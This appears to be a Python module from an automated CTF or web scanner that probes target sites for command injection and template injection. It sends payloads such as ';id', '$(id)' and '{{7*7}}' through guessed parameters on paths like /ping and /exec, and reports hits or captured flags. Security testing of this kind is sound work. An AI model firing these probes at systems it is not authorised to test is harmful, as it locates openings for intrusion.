"""命令注入 / 代码执行检查：回显型探测（|id ;id &&id 与模板语法）。

P1 只做回显型：payload 注入后响应中出现命令执行结果（uid=...）。
"""
from __future__ import annotations

from ..common import Candidate, body_of, extract_flag, get, post

CMD_PARAM_NAMES = ["cmd", "command", "exec", "ping", "ip", "host", "hostname",
                   "domain", "q", "search", "key", "param", "name", "page"]

# (载荷, 回显特征)
PAYLOADS = [
    (";id", "uid="),
    ("|id", "uid="),
    ("&&id", "uid="),
    (";whoami", "uid="),
    ("$(id)", "uid="),
    ("`id`", "uid="),
    ("{{7*7}}", "49"),       # SSTI 探测
    ("${7*7}", "49"),
    ("<% = 7*7 %>", "49"),
]

FORM_PATHS = ["/ping", "/exec", "/cmd", "/api/exec", "/api/cmd", "/shell",
              "/ping.php", "/api/v1/exec"]


def run(ctx) -> list[Candidate]:
    out: list[Candidate] = []
    base = ctx["base"].rstrip("/")

    # GET 参数注入
    for path in ("/ping", "/exec", "/cmd", "/api/exec", "/api/cmd", "/run", "/api/run"):
        if ctx["time_left"]() <= 0:
            break
        for pname in CMD_PARAM_NAMES:
            if ctx["time_left"]() <= 0:
                break
            cand = _try_payloads(ctx, lambda payload: get(
                base + path, ctx["timeout"], params={pname: payload}),
                f"{path}?{pname}=<payload>", f"GET {path}?{pname}=")
            if cand:
                out.append(cand)
                return out

    # 表单 POST 注入
    for path in FORM_PATHS:
        if ctx["time_left"]() <= 0:
            break
        for pname in CMD_PARAM_NAMES[:6]:
            if ctx["time_left"]() <= 0:
                break
            cand = _try_payloads(ctx, lambda payload: post(
                base + path, ctx["timeout"], data={pname: payload}),
                f"{path} ({pname}=<payload>)", f"POST {path} {pname}=")
            if cand:
                out.append(cand)
                return out
    return out


def _try_payloads(ctx, fetcher, url_desc: str, req_desc: str) -> Candidate | None:
    for payload, marker in PAYLOADS:
        if ctx["time_left"]() <= 0:
            return None
        r = fetcher(payload)
        if r is None:
            continue
        body = body_of(r)
        flag = extract_flag(body)
        if flag:
            return Candidate(
                type="rce", url=url_desc, request=req_desc + repr(payload),
                response=body[:300], impact="命令注入/代码执行获取 flag",
                confidence=0.95, value=flag,
                confirm={"note": f"payload {payload!r} 命中 flag"},
            )
        if marker in body and r.status_code == 200:
            return Candidate(
                type="rce", url=url_desc, request=req_desc + repr(payload),
                response=body[:300], impact=f"命令注入（回显 {marker} 特征）",
                confidence=0.85,
                confirm={"note": f"payload {payload!r} 回显 {marker}"},
            )
    return None
